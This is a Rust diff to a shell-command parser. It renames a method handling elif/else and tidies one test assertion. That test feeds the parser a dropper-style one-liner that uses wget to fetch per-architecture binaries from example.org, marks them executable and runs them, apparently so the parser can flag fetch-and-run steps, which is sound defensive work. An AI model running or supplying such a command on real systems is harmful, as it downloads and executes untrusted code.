@@ -1157,14 +1157,14 @@ impl Reader<'_> {
                 }
             }
             b"elif" => {
-                self.to_else();
+                self.turn_to_else();
                 self.open_frame(Kind::If {
                     arm: Arm::Cond,
                     status: false,
                     chained: true,
                 });
             }
-            b"else" => self.to_else(),
+            b"else" => self.turn_to_else(),
             b"fi" => {
                 while let Some(Frame {
                     kind: Kind::If { chained, .. },
@@ -1188,7 +1188,7 @@ impl Reader<'_> {
         true
     }
 
-    fn to_else(&mut self) {
+    fn turn_to_else(&mut self) {
         let mark = self.mark();
         let top = self.top();
         if let Kind::If { arm, .. } = &mut top.kind
@@ -2523,7 +2523,7 @@ mod tests {
             read("for a in arm mips; do wget http://example.org/$a; chmod +x $a; ./$a tag; done");
         let found = steps(&only(&x).nodes);
         assert_eq!(*found[0], Step::Other("for".to_string()));
-        assert_eq!(fetch(&x, found[1]).2, true);
+        assert!(fetch(&x, found[1]).2);
         assert_eq!(*found[2], Step::Arm);
         assert_eq!(*found[3], run("./$a", Some("tag")));
     }
